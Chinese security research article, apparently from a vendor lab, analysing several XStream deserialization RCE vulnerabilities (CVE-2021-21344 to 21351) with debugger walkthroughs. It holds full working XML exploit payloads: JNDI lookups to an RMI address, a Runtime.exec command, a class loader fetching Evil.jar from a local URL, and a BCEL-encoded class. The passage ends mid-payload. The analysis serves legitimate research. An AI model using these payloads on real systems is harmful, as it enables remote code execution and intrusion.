# Xstream 反序列化远程代码执行漏洞深入分析
**作者：Alpha@天融信阿尔法实验室  
原文链接：[https://mp.weixin.qq.com/s/dfi24JuezqYYEGaKnXU3xQ](https://mp.weixin.qq.com/s/dfi24JuezqYYEGaKnXU3xQ)**

前言
--

Xstream是java中一个使用比较广泛的XML序列化组件，本文以近期Xstream爆出的几个高危RCE漏洞为案例，对Xstream进行分析，同时对POC的构成原理进行讲解

1\. Xstream简介
-------------

XStream是一个简单的基于Java库，Java对象序列化到XML，反之亦然(即：可以轻易的将Java对象和xml文档相互转换)。

Xstream具有以下优点

*   使用方便 \- XStream的API提供了一个高层次外观，以简化常用的用例。
*   无需创建映射 \- XStream的API提供了默认的映射大部分对象序列化。
*   性能 \- XStream快速和低内存占用，适合于大对象图或系统。
*   干净的XML - XStream创建一个干净和紧凑XML结果，这很容易阅读。
*   不需要修改对象 \- XStream可序列化的内部字段，如私有和最终字段，支持非公有制和内部类。默认构造函数不是强制性的要求。
*   完整对象图支持 \- XStream允许保持在对象模型中遇到的重复引用，并支持循环引用。
*   可自定义的转换策略 \- 定制策略可以允许特定类型的定制被表示为XML的注册。
*   安全框架 \- XStream提供了一个公平控制有关解组的类型，以防止操纵输入安全问题。
*   错误消息 \- 出现异常是由于格式不正确的XML时，XStream抛出一个统一的例外，提供了详细的诊断，以解决这个问题。
*   另一种输出格式 \- XStream支持其它的输出格式，如JSON。

下面通过一个小案例来演示Xstream如何将java对象序列化成xml数据

首先是两个简单的pojo类，都实现了Serializable接口并且重写了readObject方法

```
import java.io.IOException;
import java.io.Serializable;

public class People implements Serializable{
    private String name;
    private int age;
    private Company workCompany;

    public People(String name, int age, Company workCompany) {
        this.name = name;
        this.age = age;
        this.workCompany = workCompany;
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public Company getWorkCompany() {
        return workCompany;
    }

    public void setWorkCompany(Company workCompany) {
        this.workCompany = workCompany;
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        System.out.println("Read People");
    }
}
```

```
public class Company implements Serializable {
    private String companyName;
    private String companyLocation;

    public Company(String companyName, String companyLocation) {
        this.companyName = companyName;
        this.companyLocation = companyLocation;
    }

    public String getCompanyName() {
        return companyName;
    }

    public void setCompanyName(String companyName) {
        this.companyName = companyName;
    }

    public String getCompanyLocation() {
        return companyLocation;
    }

    public void setCompanyLocation(String companyLocation) {
        this.companyLocation = companyLocation;
    }

    private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException {
        s.defaultReadObject();
        System.out.println("Company");
    }
}
```

然后生成一个People对象，并使用Xstream对其进行序列化

```
XStream xStream = new XStream();
People people = new People("xiaoming",25,new Company("TopSec","BeiJing"));
String xml = xStream.toXML(people);
System.out.println(xml);
```

最后的执行结果如下

```
<com.XstreamTest.People serialization="custom">
  <com.XstreamTest.People>
    <default>
      <age>25</age>
      <name>xiaoming</name>
      <workCompany serialization="custom">
        <com.XstreamTest.Company>
          <default>
            <companyLocation>BeiJing</companyLocation>
            <companyName>TopSec</companyName>
          </default>
        </com.XstreamTest.Company>
      </workCompany>
    </default>
  </com.XstreamTest.People>
</com.XstreamTest.People>
```

如果两个pojo类没有实现Serializable接口则序列化后的数据是以下这个样子

```
<com.XstreamTest.People>
  <name>xiaoming</name>
  <age>25</age>
  <workCompany>
    <companyName>TopSec</companyName>
    <companyLocation>BeiJing</companyLocation>
  </workCompany>
</com.XstreamTest.People>
```

看到这里，有些同学可能就意识到了，Xstream在处理实现了Serializable接口和没有实现Serializable接口的类生成的对象时，方法是不一样的。

在TreeUnmarshaller类的convertAnother方法处下断点，如下图所示

![](https://images.seebug.org/content/images/2021/04/06/1617677139000-1.png-w331s)

这里会获取一个converter，中文直译为转换器，Xstream的思路是通过不同的converter来处理序列化数据中不同类型的数据，我们跟进该方法看看在处理最外层的没有实现Serializable接口的People类时用的是哪种converter

![](https://images.seebug.org/content/images/2021/04/06/1617677139000-2.png-w331s)

从执行的结果中可以看到最终返回一个ReflectionConverter，当然不同的类型在这里会返回不同的Converter，这里仅仅只是处理我们自定义的未实现Serializable接口的People类时使用ReflectionConverter，该Converter的原理是通过反射获取类对象并通过反射为其每个属性进行赋值，那如过是处理实现了Serializable接口并且重写了readObject方法的People类时会有什么不一样呢？

更换序列化后的数据，在同样的位置打上断点，会发现这里处理People的Converter由ReflectionConverter变成了，SerializableConverter。

![](https://images.seebug.org/content/images/2021/04/06/1617677139000-3.png-w331s)

这是我们尝试在People类的readObject类处打上断点

![](https://images.seebug.org/content/images/2021/04/06/1617677139000-4.png-w331s)

会发现执行过程中居然调用了我们重写的readObject方法，此时的调用链如下

![](https://images.seebug.org/content/images/2021/04/06/1617677140000-5.png-w331s)

既然会调用readObject方法的话，那此时我们的思路应该就很清晰了，只需要找到一条利用链，就可以尝试进行反序列化攻击了

2\. CVE-2021-21344
------------------

下面是漏洞相关POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.rowset.JdbcRowSetImpl</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.rowset.JdbcRowSetImpl</class>
                          <name>getDatabaseMetaData</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
                  <javax.sql.rowset.BaseRowSet>
                    <default>
                      <concurrency>1008</concurrency>
                      <escapeProcessing>true</escapeProcessing>
                      <fetchDir>1000</fetchDir>
                      <fetchSize>0</fetchSize>
                      <isolation>2</isolation>
                      <maxFieldSize>0</maxFieldSize>
                      <maxRows>0</maxRows>
                      <queryTimeout>0</queryTimeout>
                      <readOnly>true</readOnly>
                      <rowSetType>1004</rowSetType>
                      <showDeleted>false</showDeleted>
                      <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                      <params/>
                    </default>
                  </javax.sql.rowset.BaseRowSet>
                  <com.sun.rowset.JdbcRowSetImpl>
                    <default>
                      <iMatchColumns>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                        <int>-1</int>
                      </iMatchColumns>
                      <strMatchColumns>
                        <string>foo</string>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                        <null/>
                      </strMatchColumns>
                    </default>
                  </com.sun.rowset.JdbcRowSetImpl>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

不难看出最外层封装的类是PriorityQueue，PriorityQueue是实现了Serializable接口并且重写了readObject方法的这点从POC中PriorityQueue的标签上也看得出，结合我们之前对XStream的分析 这次我们直接在PriorityQueued的readObject方法中打上断点。

![](https://images.seebug.org/content/images/2021/04/06/1617677140000-6.png-w331s)

研究过java反序列化的同学对PriorityQueue这个类肯定不会陌生，经典的CommonCollections利用链中有几个就用到了PriorityQueue，放一下此刻的调用链。

![](https://images.seebug.org/content/images/2021/04/06/1617677140000-7.png-w331s)

然后我们跟进heapify()方法，

![](https://images.seebug.org/content/images/2021/04/06/1617677140000-8.png-w331s)

经过一些调试来到了PriorityQueue类的siftDownUsingComparator方法中如下图所示。

![](https://images.seebug.org/content/images/2021/04/06/1617677140000-9.png-w331s)

这里调用了PriorityQueue类中存储在comparator属性中的对象的compare方法，这时我们回过头来再去看一下POC

![](https://images.seebug.org/content/images/2021/04/06/1617677140000-10.png-w331s)

我们可以很直观的从XStream序列化的数据中看到PriorityQueue类的comparator属性中存储的是一个`sun.awt.datatransfer.DataTransferer$IndexOrderComparator`类型的对象 也就是说接下来会调用`DataTransferer$IndexOrderComparator`对象的compare方法。

![](https://images.seebug.org/content/images/2021/04/06/1617677141000-11.png-w331s)

剩下的过程就是一系列的嵌套调用，最终会执行到com.sun.rowset.JdbcRowSetImpl的getDatabaseMetaData中，并最终在JdbcRowSetImpl的connect方法中通过JNDI去lookup事先封装在JdbcRowSetImpl的dataSource中的恶意地址

![](https://images.seebug.org/content/images/2021/04/06/1617677141000-12.png-w331s)

![](https://images.seebug.org/content/images/2021/04/06/1617677141000-13.png-w331s)

![](https://images.seebug.org/content/images/2021/04/06/1617677141000-14.png-w331s)

最后贴一下调用栈

![](https://images.seebug.org/content/images/2021/04/06/1617677141000-15.png-w331s)

CVE-2021-21344分析至此完毕。

2\. CVE-2021-21345
------------------

先粘贴一下cve-2021-21345的poc

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='sun.awt.datatransfer.DataTransferer$IndexOrderComparator'>
        <indexMap class='com.sun.xml.internal.ws.client.ResponseContext'>
          <packet>
            <message class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart'>
              <dataSource class='com.sun.xml.internal.ws.message.JAXBAttachment'>
                <bridge class='com.sun.xml.internal.ws.db.glassfish.BridgeWrapper'>
                  <bridge class='com.sun.xml.internal.bind.v2.runtime.BridgeImpl'>
                    <bi class='com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl'>
                      <jaxbType>com.sun.corba.se.impl.activation.ServerTableEntry</jaxbType>
                      <uriProperties/>
                      <attributeProperties/>
                      <inheritedAttWildcard class='com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection'>
                        <getter>
                          <class>com.sun.corba.se.impl.activation.ServerTableEntry</class>
                          <name>verify</name>
                          <parameter-types/>
                        </getter>
                      </inheritedAttWildcard>
                    </bi>
                    <tagName/>
                    <context>
                      <marshallerPool class='com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1'>
                        <outer-class reference='../..'/>
                      </marshallerPool>
                      <nameList>
                        <nsUriCannotBeDefaulted>
                          <boolean>true</boolean>
                        </nsUriCannotBeDefaulted>
                        <namespaceURIs>
                          <string>1</string>
                        </namespaceURIs>
                        <localNames>
                          <string>UTF-8</string>
                        </localNames>
                      </nameList>
                    </context>
                  </bridge>
                </bridge>
                <jaxbObject class='com.sun.corba.se.impl.activation.ServerTableEntry'>
                  <activationCmd>open /Applications/Calculator.app</activationCmd>
                </jaxbObject>
              </dataSource>
            </message>
            <satellites/>
            <invocationProperties/>
          </packet>
        </indexMap>
      </comparator>
    </default>
    <int>3</int>
    <string>javax.xml.ws.binding.attachments.inbound</string>
    <string>javax.xml.ws.binding.attachments.inbound</string>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

可以看到21345的利用链较之21344的利用链来说变化不大，唯一的不同点在于执行代码的位置不再使用JdbcRowSetImpl去远程加载恶意类来到本地执行恶意代码，而是使用`com.sun.corba.se.impl.activation.ServerTableEntry`类直接在本地执行恶意代码，从利用的复杂度上来和21344做比较的话无疑是简单的不少，既然整个利用链中变化的只有这一处，那就单分析这个类就可以了，将断点直接打在ServerTableEntry类的verify方法上。

![](https://images.seebug.org/content/images/2021/04/06/1617677141000-16.png-w331s)

这里直接将activationCmd属性中的值作为参数调用Runtime.exec来进行执行，而activationCmd在序列化的数据中就已经被我们自定义了值。

![](https://images.seebug.org/content/images/2021/04/06/1617677142000-17.png-w331s)

由于调用栈和CVE-2021-21344基本一样所以就不再重复粘贴的，至此CVE-2021-21345分析完毕

3\. CVE-2021-21347
------------------

首先先看下POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>Evil</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='java.net.URLClassLoader'>
                  <ucp class='sun.misc.URLClassPath'>
                    <urls serialization='custom'>
                      <unserializable-parents/>
                      <vector>
                        <default>
                          <capacityIncrement>0</capacityIncrement>
                          <elementCount>1</elementCount>
                          <elementData>
                            <url>http://127.0.0.1:80/Evil.jar</url>
                          </elementData>
                        </default>
                      </vector>
                    </urls>
                    <path>
                      <url>http://127.0.0.1:80/Evil.jar</url>
                    </path>
                    <loaders/>
                    <lmap/>
                  </ucp>
                  <package2certs class='concurrent-hash-map'/>
                  <classes/>
                  <defaultDomain>
                    <classloader class='java.net.URLClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <initialized>true</initialized>
                  <pdcache/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>-2147483648</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

可以看到这个漏洞的利用链就和之前两个大不相同了，并且在分析该漏洞的时候也踩了一些坑，在这里也和大家详细说明一下

这里我先用jdk 1.8.20版本来复现这个漏洞，然而执行的时候却返回以下错误

![](https://images.seebug.org/content/images/2021/04/06/1617677142000-18.png-w331s)

一开始没太明白这里是出了什么问题 先是跟着报错信息中提示的路径去看了一下，发现是在反序列化PriorityQueue的comparator属性的时候出现了问题。

![](https://images.seebug.org/content/images/2021/04/06/1617677142000-19.png-w331s)

经过一段跟踪调试，跟踪到类加载的地方发现根本找不到这个ObservableList$1的对象，从这个名字带有$1不难看出，这是一个匿名内部类对象，此时我们先去ObservableList这个类中去查看一下，然后发现ObservableList是一个接口类型，源码如下

```
public interface ObservableList<E> extends List<E>, Observable {

    public void addListener(ListChangeListener<? super E> listener);

    public void removeListener(ListChangeListener<? super E> listener);

    public boolean addAll(E... elements);

    public boolean setAll(E... elements);

    public boolean setAll(Collection<? extends E> col);

    public boolean removeAll(E... elements);

    public boolean retainAll(E... elements);

    public void remove(int from, int to);

    public default FilteredList<E> filtered(Predicate<E> predicate) {
        return new FilteredList<>(this, predicate);
    }

    public default SortedList<E> sorted(Comparator<E> comparator) {
        return new SortedList<>(this, comparator);
    }

    public default SortedList<E> sorted() {
        return sorted(null);
    }
}
```

发现根本就没有什么匿名内部类，此时分析陷入了僵局，然后经过该漏洞的作者threedr3am师傅的指导，尝试更换了下JDK的版本，将JDK版本更换为1.8.131版本后ObservableList的源码发生了变化。这里只粘贴关键的代码。

```
public default SortedList<E> sorted(Comparator<E> comparator) {
    return new SortedList<>(this, comparator);
}

public default SortedList<E> sorted() {
    Comparator naturalOrder = new Comparator<E>() {

        @Override
        public int compare(E o1, E o2) {
            if (o1 == null && o2 == null) {
                return 0;
            }
            if (o1 == null) {
                return -1;
            }
            if (o2 == null) {
                return 1;
            }

            if (o1 instanceof Comparable) {
                return ((Comparable) o1).compareTo(o2);
            }

            return Collator.getInstance().compare(o1.toString(), o2.toString());
        }
    };
    return sorted(naturalOrder);
}
```

可以看到sorted()方法里面多了一个Comparator类型的匿名内部类对象，而这个就是我们反序列化是POC中的那个ObservableList$1，这里写一个简单的例子验证一下

![](https://images.seebug.org/content/images/2021/04/06/1617677142000-20.png-w331s)

该漏洞利用的时候对JDK的版本有一定的限制，

接下来开始继续分析，然后当我用JDK1.8.131再次运行的时候又爆了另一个错误

![](https://images.seebug.org/content/images/2021/04/06/1617677143000-21.png-w331s)

这里提示找不到 java.security.ProtectionDomain$Key.outer-class这个属性，然后经过一段让人头秃的调试后终于搞明白了其中缘由。

首先着重看一下出现问题的POC的位置

![](https://images.seebug.org/content/images/2021/04/06/1617677143000-22.png-w331s)

导致报错的就是这个outer-class标签，报错的原因是反序列化的时候找不到这个outer-class属性，我们来到对应的类也就是ProtectionDomain$Key这个类中查看一下

![](https://images.seebug.org/content/images/2021/04/06/1617677143000-23.png-w331s)

发现key是一个静态内部类。

接下来我们要搞明白，就XStream在什么情况下在序列化的数据中出现这个outer-class标签，这里进行一个简单的实验

```
class Foo {
    private String foocontent;
    private Bar bar;

    public String getFoocontent() {
        return foocontent;
    }

    public void setFoocontent(String foocontent) {
        this.foocontent = foocontent;
    }

    public Bar getBar() {
        return bar;
    }

    public void setBar(Bar bar) {
        this.bar = bar;
    }

    class Bar {
        private String blabla;

        public String getBlabla() {
            return blabla;
        }

        public void setBlabla(String blabla) {
            this.blabla = blabla;
        }

    }

}
```

这里有两个类，一个是Foo类，另一个Bar是一个成员内部类，这里Foo有一个属性bar用来存储一个Bar类型的数据。接下来我们实例化一下这个类，然后对其属性进行赋值，并用XStream对其进行序列化。

```
 public static void main(String[] args) {
        Foo foo = new Foo();
        Bar bar = foo.new Bar();
        bar.setBlabla("hello");
        foo.setBar(bar);
        XStream xstream = new XStream();
        String xml = xstream.toXML(foo);
        System.out.println(xml);
    }
```

查看执行结果

![](https://images.seebug.org/content/images/2021/04/06/1617677143000-24.png-w331s)

当引用了自己的成员内部类时，XStream就会通过outer-class来进行标识。在回过去看poc就可以理解这里表示的意思是Key作为一个成员内部类被ProtectionDomain引用，但是在jdk1.8.131中ProtectionDomain$Key是一个静态内部类呀，静态内部类XStream序列化的时候是不会通过\\<outer-class>标签进行标识的

介于之前菜的坑，我又将jdk版本更换到1.8.221版本此时再看ProtectionDomain$Key这个类，可以看到在1.8.221版本的jdk中，Key已经从静态内部来改成一个成员内部类了，此时在运行POC就不会报找不到outer-class的错误了。

![](https://images.seebug.org/content/images/2021/04/06/1617677143000-25.png-w331s)

当然既然在jdk1.8.131版本中Key时静态内部类，那我们也可以直接通过在POC中删除\\<outer-class>这个标签来避免这个报错。

不过虽然时不报错了，但是我们还是没搞清楚这个outer-class究竟为什么会有这条属性，这里引用一篇文章[java非静态内部类中的属性this$0](https://blog.csdn.net/doctor_who2004/article/details/102329237)

接着用我们写的Demo中的Foo类和它的成员内部类Bar类来进行讲解，在Foo$Bar对象生成过后我打一个断点

![](https://images.seebug.org/content/images/2021/04/06/1617677143000-26.png-w331s)

这里有一个变量名为this$0的一个变量，仔细观察他的类型，发现是一个Foo类型的，也就是说他是Foo这个最外层的类对象，还记得学习java基础的时候在学习内部类的时候学过的一个知识点，就是内部类可以直接使用外部类的公有或私有变量，而外部类却不能直接使用内部类的变量，就是因为内部类会在编译时就加入一个外部类作为变量。

搞明白了这一点后我们就继续分析gadget

同样的PriorityQueue部分就不再重复讲解了，只贴一下调用链

![](https://images.seebug.org/content/images/2021/04/06/1617677144000-27.png-w331s)

我们从ObsevableList$1这个匿名内部类开始讲起，我们来看下这个匿名内部类的实现

![](https://images.seebug.org/content/images/2021/04/06/1617677144000-28.png-w331s)

这里 o1和o2是同一个Base64Data对象，目的调用Base64Data.toString方法，跟入查看toString方法详情

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-29.png-w331s)

toString方法中调用了Base64Data.get方法，继续跟入，在get方法中调用了ByteArrayOutputStreamEx.readFrom()方法，而传入的参数则是一个SequenceInputStream对象。

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-30.png-w331s)

这里先粘贴一下此时整个Base64Data对象的封装情况。

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-31.png-w331s)

跟入ByteArrayOutputStreamEx.readFrom()方法，经过几次嵌套调用后，来到了SequenceInputStream.nextStream()方法中，这里的关键是调用了属性e，也就是POC中就封装进去的MultiUIDefaults$MultiUIDefaultsEnumerator对象的hasMoreElements()方法

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-32.png-w331s)

继续跟进，就会看到调用了JavacProcessingEnvironment$NameProcessIterator.hasNext()方法

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-33.png-w331s)

当跟入到hasNext()方法方法后可以看到该方法中的关键点在于，调用processorCL的loadClass方法

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-34.png-w331s)

我们直接从POC中来查看processorCL就是封装进去的URLClassLoader对象，而var1就是封装入names属性中的Arrays$ArrayList对象中存储的字符串也就是恶意类的名字。

![](https://images.seebug.org/content/images/2021/04/06/1617677145000-35.png-w331s)

接下来的步骤就是通过URLClassloader去远程加载恶意类到本地 然后执行静态代码块中的恶意代码从而导致RCE，这个过程就不进行深入赘述了，至此CVE-2021-21347漏洞分析完毕

4\. CVE-2021-21350
------------------

粘贴一下POC

```
<java.util.PriorityQueue serialization='custom'>
  <unserializable-parents/>
  <java.util.PriorityQueue>
    <default>
      <size>2</size>
      <comparator class='javafx.collections.ObservableList$1'/>
    </default>
    <int>3</int>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
      <dataHandler>
        <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'>
          <contentType>text/plain</contentType>
          <is class='java.io.SequenceInputStream'>
            <e class='javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator'>
              <iterator class='com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator'>
                <names class='java.util.AbstractList$Itr'>
                  <cursor>0</cursor>
                  <lastRet>-1</lastRet>
                  <expectedModCount>0</expectedModCount>
                  <outer-class class='java.util.Arrays$ArrayList'>
                    <a class='string-array'>
                      <string>$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQ$ddN$c20$Y$3d$85$c9$60$O$e5G$fcW$f0J0Qn$bc$c3$Y$T$83$89$c9$oF$M$5e$97$d9$60$c9X$c9$d6$R$5e$cb$h5$5e$f8$A$3e$94$f1$x$g$q$b1MwrN$cf$f9$be$b6$fb$fcz$ff$Ap$8a$aa$83$MJ$O$caX$cb$a2bp$dd$c6$86$8dM$86$cc$99$M$a5$3egH$d7$h$3d$G$ebR$3d$K$86UO$86$e2$s$Z$f5Et$cf$fb$B$v$rO$f9$3c$e8$f1H$g$fe$xZ$faI$c6T$c3kOd$d0bp$daS_$8c$b5Talc$8bxW$r$91$_$ae$a41$e7$8c$e9d$c8$t$dc$85$8d$ac$8dm$X$3b$d8$a5$d2j$y$c2$da1$afQ$D$3f$J$b8V$91$8b$3d$ecS$7d$Ta$u$98P3$e0$e1$a0$d9$e9$P$85$af$Z$ca3I$aa$e6ug$de$93$a1$f8g$bcKB$zG$d4$d6$Z$I$3d$t$95z$c3$fb$e7$a1$83$5bb$w$7c$86$c3$fa$c2nWG2$i$b4$W$D$b7$91$f2E$i$b7p$80$rzQ3$YM$ba$NR$c8$R$bb$md$84$xG$af$60oH$95$d2$_$b0$k$9eII$c11$3a$d2$f4$cd$c2$ow$9e$94eb$eeO$820$3fC$d0$$$fd$BZ$85Y$ae$f8$N$93$85$cf$5c$c7$B$A$A</string>
                    </a>
                  </outer-class>
                </names>
                <processorCL class='com.sun.org.apache.bcel.internal.util.ClassLoader'>
                  <parent class='sun.misc.Launcher$ExtClassLoader'>
                  </parent>
                  <package2certs class='hashtable'/>
                  <classes defined-in='java.lang.ClassLoader'/>
                  <defaultDomain>
                    <classloader class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='../..'/>
                    <principals/>
                    <hasAllPerm>false</hasAllPerm>
                    <staticPermissions>false</staticPermissions>
                    <key>
                      <outer-class reference='../..'/>
                    </key>
                  </defaultDomain>
                  <packages/>
                  <nativeLibraries/>
                  <assertionLock class='com.sun.org.apache.bcel.internal.util.ClassLoader' reference='..'/>
                  <defaultAssertionStatus>false</defaultAssertionStatus>
                  <classes/>
                  <ignored__packages>
                    <string>java.</string>
                    <string>javax.</string>
                    <string>sun.</string>
                  </ignored__packages>
                  <repository class='com.sun.org.apache.bcel.internal.util.SyntheticRepository'>
                    <__path>
                      <paths/>
                      <class__path>.</class__path>
                    </__path>
                    <__loadedClasses/>
                  </repository>
                  <deferTo class='sun.misc.Launcher$ExtClassLoader' reference='../parent'/>
                </processorCL>
              </iterator>
              <type>KEYS</type>
            </e>
            <in class='java.io.ByteArrayInputStream'>
              <buf></buf>
              <pos>0</pos>
              <mark>0</mark>
              <count>0</count>
            </in>
          </is>
          <consumed>false</consumed>
        </dataSource>
        <transferFlavors/>
      </dataHandler>
      <dataLen>0</dataLen>
    </com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data>
    <com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data reference='../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'/>
  </java.util.PriorityQueue>
</java.util.PriorityQueue>
```

该漏洞的整个利用链和CVE-2021-21345如出一辙，不同的地方在于，最后的加载恶意Class的Classloader不再使用URLClassloader去远程加载，而是采用了com.sun.org.apache.bcel.internal.util.ClassLoader，这里相信对FastJson有了解的同学应该不陌生，这里使用了BCEL的方式来进行恶意代码执行

![](https://images.seebug.org/content/images/2021/04/06/1617677146000-36.png-w331s)

但是整个利用链和CVE-2021-21347是一样的，所以这里也就不重复赘述了。

5\. CVE-2021-21351
------------------

粘贴一下POC

```
<sorted-set>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XRTreeFrag'>
      <m__DTMXRTreeFrag>
        <m__dtm class='com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM'>
          <m__size>-10086</m__size>
          <m__mgrDefault>
            <__overrideDefaultParser>false</__overrideDefaultParser>
            <m__incremental>false</m__incremental>
            <m__source__location>false</m__source__location>
            <m__dtms>
              <null/>
            </m__dtms>
            <m__defaultHandler/>
          </m__mgrDefault>
          <m__shouldStripWS>false</m__shouldStripWS>
          <m__indexing>false</m__indexing>
          <m__incrementalSAXSource class='com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces'>
            <fPullParserConfig class='com.sun.rowset.JdbcRowSetImpl' serialization='custom'>
              <javax.sql.rowset.BaseRowSet>
                <default>
                  <concurrency>1008</concurrency>
                  <escapeProcessing>true</escapeProcessing>
                  <fetchDir>1000</fetchDir>
                  <fetchSize>0</fetchSize>
                  <isolation>2</isolation>
                  <maxFieldSize>0</maxFieldSize>
                  <maxRows>0</maxRows>
                  <queryTimeout>0</queryTimeout>
                  <readOnly>true</readOnly>
                  <rowSetType>1004</rowSetType>
                  <showDeleted>false</showDeleted>
                  <dataSource>rmi://localhost:15000/CallRemoteMethod</dataSource>
                  <listeners/>
                  <params/>
                </default>
              </javax.sql.rowset.BaseRowSet>
              <com.sun.rowset.JdbcRowSetImpl>
                <default/>
              </com.sun.rowset.JdbcRowSetImpl>
            </fPullParserConfig>
            <fConfigSetInput>
              <class>com.sun.rowset.JdbcRowSetImpl</class>
              <name>setAutoCommit</name>
              <parameter-types>
                <class>boolean</class>
              </parameter-types>
            </fConfigSetInput>
            <fConfigParse reference='../fConfigSetInput'/>
            <fParseInProgress>false</fParseInProgress>
          </m__incrementalSAXSource>
          <m__walker>
            <nextIsRaw>false</nextIsRaw>
          </m__walker>
          <m__endDocumentOccured>false</m__endDocumentOccured>
          <m__idAttributes/>
          <m__textPendingStart>-1</m__textPendingStart>
          <m__useSourceLocationProperty>false</m__useSourceLocationProperty>
          <m__pastFirstElement>false</m__pastFirstElement>
        </m__dtm>
        <m__dtmIdentity>1</m__dtmIdentity>
      </m__DTMXRTreeFrag>
      <m__dtmRoot>1</m__dtmRoot>
      <m__allowRelease>false</m__allowRelease>
    </value>
  </javax.naming.ldap.Rdn_-RdnEntry>
  <javax.naming.ldap.Rdn_-RdnEntry>
    <type>ysomap</type>
    <value class='com.sun.org.apache.xpath.internal.objects.XString'>
      <m__obj class='string'>test</m__obj>
